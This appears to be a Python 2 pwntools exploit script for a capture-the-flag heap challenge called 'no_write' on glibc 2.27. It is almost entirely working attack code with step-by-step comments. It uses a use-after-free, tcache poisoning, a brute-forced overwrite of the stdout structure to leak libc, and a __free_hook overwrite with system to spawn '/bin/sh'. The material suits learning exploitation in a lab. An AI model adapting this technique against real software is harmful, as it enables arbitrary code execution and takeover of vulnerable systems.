#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
import signal
import sys
from pwn import *


se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

def alloc(idx, size):
    sla(">", "1")
    sla("idx:", str(idx))
    sla("size: ", str(size))

def free(idx):
    sla(">", "2")
    sla("idx:", str(idx))

def read(idx, data):
    sla(">", "3")
    sla("idx:", str(idx))
    sa("data:", data)

def write(idx):
    sla(">", "4")
    sla("idx: \n", str(idx))
    s = ru("1. alloc")
    return s


def signal_handler(signal, frame):
    print('You pressed Ctrl+C!')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

elf = ELF('./no_write')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])

while True:
    try:
        p = process("./no_write")




        ## [Glibc 2.27 Uaf no_write Attack Roadmap]
        ## 1. Construct overlapped heap chunk with UAF
        ## 2. Free one heap chunk into tcache_bin, and also, modify free it gain to make it be into unsorted bin
        ## 3. Bruteforth the lowest 2 bytes of glibc address to make it point to IO_stdout
        ## 4. Modify the content of stdout to leak libc address
        ## 5. Then perform attack on free_hook to get shell




        ## ---------------------- [Step 1] -------------------------- ##
        ## Prepare heap chunk for attacking
        alloc(0, 0x6a0)
        alloc(1, 0x10)
        alloc(8, 0x10)


        ## Free chunk_0, it would be inserted into unsorted bin
        free(0)


        ## Allocate more heap chunks, they would be taken out from unsorted bin thus overlapped with chunk_0
        alloc(2, 0x10)
        alloc(3, 0x30)
        alloc(4, 0x600)
        alloc(5, 0x20)


        ## Free chunk_3, it would be inserted into tcache bin
        ## tcache_bin(0x40) -> chunk_3
        free(3)


        ## Modify the size field of chunk_3 to a large value (here it is 0x651), then free it to inserted 
        ## it into unsorted bin again
        ## [Bypass security check]
        ## 1. The last pre_in_used bit should be 1 (previous chunk is not freed)
        ## 2. The size field should be the combinaion of chunk_2(0x30 + 0x10)  and chunk_3(0x600 + 0x10), this is for security check bypass
        read(0, "a" * 0x10 + p64(0) + p64(0x651))


        ## Then free chunk_3 again, it would also be inserted into unsorted_bin, fd would become address of unsorted bin
        ## tcache_bin(0x30) -> chunk_3 --> unsorted_bin
        free(3)


        ## Then we bruteforth its last 2 bytes
        ## tcache_bin(0x30) -> chunk_3 --> stdout
        read(3, "\x60\x37")


        ## Chunk_7 == stdout
        alloc(6, 0x30)
        alloc(7, 0x30)


        ## chunk_7 is exactly on stdout, we modify its flag bytes and lowerest byte of _IO_write_base
        read(7, p64(0xfbad1887) + p64(0) * 3 + '\x70')



        ## Then we have libc address
        # leak_addr = u64(ru("1. alloc")[0x10:0x16] + "\x00\x00")
        leak_addr = u64(ru("1. alloc")[0x10+2 : 0x10+6+2] + "\x00\x00")
        libc_base = leak_addr - 0x3ec770
        system_addr = libc_base + 0x4f420
        free_hook_addr = libc_base + 0x3ed8e8
        print(hex(leak_addr))
        p.interactive()






        ## ---------------------- [Step 2] -------------------------- ##
        ## Just modify fd of tcache bin to free_hook
        free(1)
        read(1, p64(free_hook_addr))
        alloc(9, 0x10)
        alloc(10, 0x10)








        ## ---------------------- [Step 3] -------------------------- ##
        ## Modify free_hook to be system
        read(10, p64(system_addr))


        ## The below operation would be system("/bin/sh")
        read(9, "/bin/sh\n")
        free(9)
        p.interactive()
    except:
        pause()
        continue